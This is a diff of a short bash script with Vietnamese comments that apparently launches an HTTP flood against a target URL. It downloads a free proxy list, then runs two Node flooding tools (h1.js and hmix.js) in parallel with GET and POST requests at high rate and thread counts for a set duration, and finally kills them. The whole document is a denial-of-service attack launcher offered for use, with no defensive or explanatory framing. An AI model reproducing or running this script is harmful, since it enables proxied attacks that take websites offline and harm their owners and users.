@@ -2,18 +2,23 @@
 
 [ $# -lt 2 ] && echo "Usage: $0 URL TIME" && exit 1
 
-URL=$1
-TIME=$2
+URL="$1"
+TIME="$2"
+THREADS=10
+RATE=999
+PFILE="hihi.txt"
 
-> live.txt
-for p in http https; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$p"
-done | sort -u > live.txt
+# Tải proxy 1 lần
+curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999' | sort -u > live.txt
 
-pids=""
-for m in GET POST; do
-  node h1.js $m "$URL" live.txt "$TIME" 999 10 randomstring=true & pids="$pids $!"
-  node hmix.js -m $m -u $URL -s $TIME -p hihi.txt -t 10 -r 999 --full true -d false & pids="$pids $!"
+# Chạy tấn công song song cho GET và POST
+for METHOD in GET POST; do
+    node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true &
+    PIDS+=($!)
+    node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false &
+    PIDS+=($!)
 done
 
-wait $pids
+# Đợi và kill sau TIME
+sleep "$TIME"
+kill -9 "${PIDS[@]}" 2>/dev/null
